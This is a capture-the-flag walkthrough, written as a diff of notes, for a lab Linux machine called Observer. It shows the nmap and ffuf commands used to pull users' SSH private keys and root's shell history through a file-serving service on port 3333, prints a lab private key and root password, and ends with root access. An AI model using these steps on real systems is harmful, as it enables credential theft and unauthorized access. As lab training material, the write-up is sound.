@@ -1,1 +1,420 @@
+			ENUMERATION
+			
+
+---nmap on our target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.55 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 13:36 +03
+Nmap scan report for 10.0.2.55
+Host is up (0.00072s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)
+|_  256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)
+3333/tcp open  dec-notes?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 11 May 2024 10:37:47 GMT
+|     Content-Length: 105
+|     Content-Type: text/plain; charset=utf-8
+|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST 
+|     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
+|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 11 May 2024 10:37:22 GMT
+|     Content-Length: 78
+|     Content-Type: text/plain; charset=utf-8
+|     OBSERVING FILE: /home/ NOT EXIST 
+|     <!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 11 May 2024 10:37:22 GMT
+|     Content-Length: 78
+|     Content-Type: text/plain; charset=utf-8
+|     OBSERVING FILE: /home/ NOT EXIST 
+|_    <!-- DaFpLSjFbcXoEFfRsWxPLDnJObCsNVHMV -->
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3333-TCP:V=7.94SVN%I=7%D=5/11%Time=663F4A56%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
+SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
+SF:\r\n400\x20Bad\x20Request")%r(GetRequest,C3,"HTTP/1\.0\x20200\x20OK\r\n
+SF:Date:\x20Sat,\x2011\x20May\x202024\x2010:37:22\x20GMT\r\nContent-Length
+SF::\x2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVI
+SF:NG\x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20XVlBzgbaiCMRAjWw
+SF:hTHctcuAxhxKQFHMV\x20-->")%r(HTTPOptions,C3,"HTTP/1\.0\x20200\x20OK\r\n
+SF:Date:\x20Sat,\x2011\x20May\x202024\x2010:37:22\x20GMT\r\nContent-Length
+SF::\x2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVI
+SF:NG\x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20DaFpLSjFbcXoEFfR
+SF:sWxPLDnJObCsNVHMV\x20-->")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x2
+SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
+SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x
+SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
+SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"H
+SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
+SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Te
+SF:rminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+SF:x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
+SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
+SF:close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x2
+SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
+SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,DF
+SF:,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2011\x20May\x202024\x2010:37
+SF::47\x20GMT\r\nContent-Length:\x20105\r\nContent-Type:\x20text/plain;\x2
+SF:0charset=utf-8\r\n\r\nOBSERVING\x20FILE:\x20/home/nice\x20ports,/Trinit
+SF:y\.txt\.bak\x20NOT\x20EXIST\x20\n\n\n<!--\x20lgTeMaPEZQleQYhYzRyWJjPjzp
+SF:fRFEHMV\x20-->");
+MAC Address: 08:00:27:3F:7A:10 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.72 ms 10.0.2.55
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 127.45 seconds
+               
+
+
+---we see open ssh and dec-notes? ports---
+
+
+---I try to check out the website but can't access it---
+
+
+
+---we can try listening to the 3333 port and then try to enter the website again---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nc 10.0.2.55 3333                    
+
+
+---go to 10.0.2.55:3333 on web browser and now you can see the content---
+
+
+OBSERVING FILE: /home/ NOT EXIST 
+
+
+<!-- AZWEXejhAquXdaaaZlRHoNXvpayoSsHMV -->
+
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://10.0.2.55:3333/FUZZ
+
+
+
+---I ran this and discovered lots and lots of users, now to explore further we can try to search if any of these
+users have id_rsa key file, so we can connect to ssh server as that user. To do so:
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u 'http://10.0.2.55:3333/FUZZ/.ssh/id_rsa' -fw 8 -fl 4 -c -mc 200,301,302,401 -fc 404,500,401 
+
+
+-c: Colorize output
+-mc: Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)
+-fc: Filter HTTP status codes from response. Comma separated list of codes and ranges
+-w: Wordlist
+-u: URL
+-fw: Filter by amount of words in response. Comma separated list of word counts and ranges
+-fl: Filter by amount of lines in response. Comma separated list of line counts and ranges
+
+
+
+---we find the name jan, let's check the website---
+http://10.0.2.55:3333/jan/.ssh/id_rsa
+
+
+
+---we find the private key of the user---
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+
+
+---save it as id_rsa and then login to ssh---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/30- OBSERVER LINUX CTF]
+└─# ssh -i id_rsa jan@10.0.2.55
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+jan@10.0.2.55's password: 
+
+zsh: suspended  ssh -i id_rsa jan@10.0.2.55
+                       
+
+---says that the permissions are too open so I change it---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/30- OBSERVER LINUX CTF]
+└─# chmod 700 id_rsa 
+       
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/30- OBSERVER LINUX CTF]
+└─# ssh jan@10.0.2.55 -i id_rsa
+Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Aug 21 20:21:22 2023 from 192.168.0.100
+jan@observer:~$ ls
+user.txt
+jan@observer:~$ cat user.txt 
+---First User Flag---
+
+
+
+---Here we gain our first foothold and first flag. Let's keep on looking around---
+			
+
+
+---Check for SUID permissions---
+
+			
+jan@observer:~$ sudo -l
+Matching Defaults entries for jan on observer:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User jan may run the following commands on observer:
+    (ALL) NOPASSWD: /usr/bin/systemctl -l status
+
+
+---let's run this command---
+
+
+jan@observer:~$ /usr/bin/systemctl -l status
+● observer
+    State: running
+    Units: 235 loaded (incl. loaded aliases)
+     Jobs: 0 queued
+   Failed: 0 units
+    Since: Sat 2024-05-11 12:28:56 CEST; 2h 8min ago
+  systemd: 252.12-1~deb12u1
+   CGroup: /
+           ├─init.scope
+           │ └─1 /sbin/init
+           ├─system.slice
+           │ ├─cron.service
+           │ │ ├─300 /usr/sbin/cron -f
+           │ │ ├─313 /usr/sbin/CRON -f
+           │ │ ├─321 /bin/sh -c /opt/observer
+           │ │ ├─321 /bin/sh -c /opt/observer
+           │ │ └─323 /opt/observer
+           │ ├─dbus.service
+           
+.
+.
+.
+
+
+
+--- we discover /opt/observer, let's check it---
+
+
+---This is an encrypted file so cat doesn't give me much, I can't use strings or file commands neither---
+
+
+---I check the the directory of jan, maybe we can get something from there---
+
+
+jan@observer:~$ ls -la
+total 44
+drwx------ 4 jan  jan  4096 may 11 14:37 .
+drwxr-xr-x 3 root root 4096 ago 21  2023 ..
+-rw------- 1 jan  jan   133 ago 21  2023 .bash_history
+-rw-r--r-- 1 jan  jan   220 ago 21  2023 .bash_logout
+-rw-r--r-- 1 jan  jan  3526 ago 21  2023 .bashrc
+-rw------- 1 jan  jan    20 may 11 14:37 .lesshst
+drwxr-xr-x 3 jan  jan  4096 ago 21  2023 .local
+-rw-r--r-- 1 jan  jan   807 ago 21  2023 .profile
+drwx------ 2 jan  jan  4096 ago 21  2023 .ssh
+-rw------- 1 jan  jan    24 ago 21  2023 user.txt
+-rw------- 1 jan  jan    54 ago 21  2023 .Xauthority
+
+
+
+---let's take a look at the commands jan have used---
+
+
+jan@observer:~$ cat .bash_history 
+passwd
+cd
+ssh-keygen
+cd .ssh
+ls
+cp id_rsa.pub authorized_keys
+exit
+nano user.txt
+chmod 600 user.txt 
+ls -l
+su root
+exit
+sudo -l
+exit
+
+
+---we see that "su root" command was run, so there might be a way to do so---
+
+
+---I try using the ln command to create links between files, see if there is a link here or not that can tie us
+to the root user. I try it but it gives an error let's use "ln -s" to create a symbolic link---
+
+
+jan@observer:~$ ln -s /root root
+jan@observer:~$ ls
+root  user.txt
+jan@observer:~$ cd root
+-bash: cd: root: Permiso denegado
+
+
+
+---Okay, here we see that there is folder that probably belongs to root, this gives us an idea, if we can 
+check the bash history of root we can maybe discover the password---
+
+
+---We can't do much with our restrictions, but we know that we can check it from the website likw we did for
+jan. We need to check /jan/root/.bash_history---
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+---From our main terminal we can try to see the contents of the webpage, using curl---
+
+┌──(root㉿kali)-[/home/okina]
+└─# curl http://10.0.2.55:3333/jan/root/.bash_history
+ip a
+exit
+apt-get update && apt-get upgrade
+apt-get install sudo
+cd
+wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
+tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
+rm go1.12.linux-amd64.tar.gz 
+export PATH=$PATH:/usr/local/go/bin
+nano observer.go
+go build observer.go 
+mv observer /opt
+ls -l /opt/observer 
+crontab -e
+nano root.txt
+chmod 600 root.txt 
+nano /etc/sudoers
+nano /etc/ssh/sshd_config
+paswd
+fuck1ng0bs3rv3rs
+passwd
+su jan
+nano /etc/issue
+nano /etc/network/interfaces
+ls -la
+exit
+ls -la
+cat .bash_history
+ls -la
+ls -la
+cat .bash_history
+ls -l
+cat root.txt 
+cd /home/jan
+ls -la
+cat user.txt 
+su jan
+reboot
+shutdown -h now
+
+
+
+---we see "passwd" command which is used to change the password and then "fuck1ng0bs3rv3rs". 
+This looks like the password of the root user---
+
+
+jan@observer:~$ su root
+Contraseña: 
+root@observer:/home/jan# cd ~
+root@observer:~# ls
+observer.go  root.txt
+root@observer:~# cat root.txt 
+---Root User Flag---
+
+
+
+---Boom, we became root and got the flag---
+
 
